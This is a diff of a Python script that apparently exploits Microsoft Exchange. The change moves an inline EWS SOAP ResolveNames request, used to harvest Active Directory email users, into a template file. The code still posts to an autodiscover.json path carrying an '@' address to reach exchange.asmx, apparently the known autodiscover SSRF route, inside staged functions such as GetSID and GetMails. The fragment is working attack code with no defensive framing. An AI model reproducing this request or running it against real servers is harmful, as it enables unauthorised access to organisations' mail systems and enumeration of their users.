@@ -77,20 +77,7 @@ def GetSID(target, legacyDn):
 
 def GetMails(target):
     logger.debug("[Stage 444] Get 100 email users")
-    soap_body = '''<soap:Envelope
-  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-  xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
-  xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
-  xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
-  <soap:Header>
-    <t:RequestServerVersion Version="Exchange2016" />
-  </soap:Header>
- <soap:Body>
-    <m:ResolveNames ReturnFullContactData="true" SearchScope="ActiveDirectory">
-      <m:UnresolvedEntry>SMTP:</m:UnresolvedEntry>
-    </m:ResolveNames>
-  </soap:Body>
-</soap:Envelope>'''
+    soap_body = convertFromTemplate({},templatesFolder + "GetMails.xml")
     stage444 = requests.post(
         f"https://{target}/autodiscover/autodiscover.json?a=a@edu.edu/ews/exchange.asmx", headers={
             "Content-Type": "text/xml",
